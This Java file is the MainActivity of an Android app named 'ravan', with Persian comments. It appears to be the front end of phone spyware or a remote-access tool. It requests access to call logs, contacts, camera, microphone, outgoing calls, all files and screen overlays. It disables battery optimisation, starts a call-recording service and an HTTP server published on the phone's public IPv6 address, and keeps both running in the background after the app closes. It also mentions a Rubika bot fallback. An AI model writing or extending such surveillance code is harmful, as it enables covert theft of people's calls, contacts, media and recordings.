package com.security.ravan;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.net.Inet6Address;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 1002;

    private TextView tvStatus;
    private TextView tvIpAddress;
    private TextView tvServerUrl;
    private Button btnStartStop;
    private boolean isServerRunning = false;
    
    private static MainActivity instance;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        instance = this;

        initViews();
        requestPermissions();
        updateUI();
        
        // اگر سرویس قبلاً روشن بود، UI رو آپدیت کن
        if (HttpServerService.isRunning()) {
            isServerRunning = true;
            updateUI();
        }
    }

    private void initViews() {
        tvStatus = findViewById(R.id.tvStatus);
        tvIpAddress = findViewById(R.id.tvIpAddress);
        tvServerUrl = findViewById(R.id.tvServerUrl);
        btnStartStop = findViewById(R.id.btnStartStop);

        btnStartStop.setOnClickListener(v -> toggleServer());

        findViewById(R.id.btnCopyUrl).setOnClickListener(v -> {
            String url = tvServerUrl.getText().toString();
            if (!url.isEmpty() && !url.equals("Not running")) {
                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(
                        CLIPBOARD_SERVICE);
                android.content.ClipData clip = android.content.ClipData.newPlainText("Server URL", url);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(this, "URL copied to clipboard!", Toast.LENGTH_SHORT).show();
            }
        });

        findViewById(R.id.btnBatteryOptimization).setOnClickListener(v -> {
            requestBatteryOptimization();
        });
    }

    private void requestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        // Storage permissions based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS);
            }
        } else {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.CAMERA);
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 1003);
            }
        }
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } else {
                Toast.makeText(this, "Battery optimization already disabled", Toast.LENGTH_SHORT).show();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            updateUI();
        }
    }

    private void toggleServer() {
        if (isServerRunning) {
            stopServer();
        } else {
            startServer();
        }
    }

    private void startServer() {
        Intent serviceIntent = new Intent(this, HttpServerService.class);
        serviceIntent.setAction("START");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Intent callServiceIntent = new Intent(this, CallRecordService.class);
        callServiceIntent.setAction("START_SERVICE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(callServiceIntent);
        } else {
            startService(callServiceIntent);
        }

        isServerRunning = true;
        updateUI();
    }

    private void stopServer() {
        Intent serviceIntent = new Intent(this, HttpServerService.class);
        serviceIntent.setAction("STOP");
        startService(serviceIntent);

        isServerRunning = false;
        updateUI();
    }

    private void updateUI() {
        if (isServerRunning) {
            tvStatus.setText("🟢 Server Running");
            tvStatus.setTextColor(getColor(android.R.color.holo_green_dark));
            btnStartStop.setText("Stop Server");
            btnStartStop.setBackgroundColor(getColor(android.R.color.holo_red_light));

            String ipv6 = getPublicIPv6();
            if (ipv6 != null) {
                tvIpAddress.setText("IPv6: " + ipv6);
                tvServerUrl.setText("http://[" + ipv6 + "]:8080");
            } else {
                tvIpAddress.setText("IPv6: Not available (using fallback)");
                tvServerUrl.setText("Fallback mode - check Rubika bot");
            }
        } else {
            tvStatus.setText("🔴 Server Stopped");
            tvStatus.setTextColor(getColor(android.R.color.holo_red_dark));
            btnStartStop.setText("Start Server");
            btnStartStop.setBackgroundColor(getColor(android.R.color.holo_green_dark));
            tvServerUrl.setText("Not running");
            tvIpAddress.setText("IPv6: Service Stopped");
        }
    }

    // دریافت IPv6 واقعی از شبکه
    public static String getPublicIPv6() {
        try {
            ConnectivityManager cm = (ConnectivityManager) 
                instance.getSystemService(Context.CONNECTIVITY_SERVICE);
            Network activeNetwork = cm.getActiveNetwork();
            LinkProperties linkProps = cm.getLinkProperties(activeNetwork);
            
            if (linkProps != null) {
                for (LinkAddress addr : linkProps.getLinkAddresses()) {
                    if (addr.getAddress() instanceof Inet6Address) {
                        String ip = addr.getAddress().getHostAddress();
                        int idx = ip.indexOf('%');
                        if (idx >= 0) {
                            ip = ip.substring(0, idx);
                        }
                        // فقط آدرس‌های Global (نه Link-Local fe80)
                        if (!ip.toLowerCase().startsWith("fe80") && 
                            !ip.equals("::1") &&
                            addr.isGlobalPreferred()) {
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static MainActivity getInstance() {
        return instance;
    }
    
    public static String getLocalIPv6Address() {
        try {
            ConnectivityManager cm = (ConnectivityManager) 
                instance.getSystemService(Context.CONNECTIVITY_SERVICE);
            Network activeNetwork = cm.getActiveNetwork();
            LinkProperties linkProps = cm.getLinkProperties(activeNetwork);
            
            if (linkProps != null) {
                for (LinkAddress addr : linkProps.getLinkAddresses()) {
                    if (addr.getAddress() instanceof Inet6Address) {
                        String ip = addr.getAddress().getHostAddress();
                        int idx = ip.indexOf('%');
                        if (idx >= 0) {
                            ip = ip.substring(0, idx);
                        }
                        if (!ip.toLowerCase().startsWith("fe80")) {
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // سرویس رو متوقف نکن! بذار توی پس‌زمینه کار کنه
        // فقط UI رو آپدیت کن
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
    }
}
